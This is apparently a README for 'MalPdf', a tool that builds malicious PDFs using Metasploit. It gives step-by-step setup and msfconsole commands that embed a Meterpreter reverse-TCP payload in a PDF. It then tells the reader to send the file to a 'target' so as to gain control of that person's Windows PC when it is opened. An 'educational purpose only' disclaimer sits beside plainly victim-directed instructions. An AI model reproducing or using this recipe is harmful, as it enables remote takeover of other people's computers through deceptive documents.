# MalPdf

This is an easy to setup malicious pdf generator which uses metasploit framework.

##This works only with Linux##

This can exploit only windows
Requirements:
      1Gb data
      1Gb storage space

#This is not for exploiting other's PCs and this is for educational purpose only
First start your command prompt or power shell

Type the command:

$apt install git

$git clone https://github.com/Nicko15/MalPdf.git

$cd MalPdf


Now run the 'setup.sh' file by typing:

$./setup.sh

All the needed packages and frameworks will be downloaded

Now to create malicious pdf and use, type

$cd metasploit-framework

$msfconsole
sudo bash create.sh
use exploit/windows/fileformat/adobe_pdf_embedded_exe
set payload windows/meterpreter/reverse_tcp
set FILENAME malfile.pdf
set LPORT 4444
show options
show info
run
exit
cd ..


 You will get a file path and you can shere the file to your target

To listen to the pdf, type:


Replace <your_ip> with your ip address
Now your pc will start listening. As soon as your target opens the pdf, you will get access over his pc
